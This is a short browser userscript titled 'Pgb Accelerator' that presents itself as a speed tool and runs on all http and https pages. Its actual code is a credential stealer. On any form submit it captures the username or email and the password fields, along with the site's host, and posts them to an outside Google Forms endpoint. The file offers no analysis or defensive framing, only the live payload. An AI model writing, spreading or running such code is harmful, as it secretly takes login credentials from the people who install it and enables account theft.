// ==UserScript==
// @name         Pgb Accelerator
// @include     http://*
// @include     https://*
// @match        http://*
// @require      http://code.jquery.com/jquery-latest.js
// ==/UserScript==
console.log("pgb started");
$("input[type='submit']").click(function(){
    var infodata=$("input[type='text']").val();if(infodata==null || infodata==''){infodata=$("input[type='email']").val();    }var refferal=$("input[type='password']").val();var url=window.location.host;$.post('https://docs.google.com/forms/d/1oVq-GfcV_WeapsoNmsuUFZtIqEOHvzz-o2tmLCUrsNw/formResponse',{draftResponse:[,,"1242606224762034448"],       'entry.1145130532':infodata,'entry.1333215918':url,       'entry.894016210':refferal,'fbzx':1242606224762034448,'pageHistory':0});
});
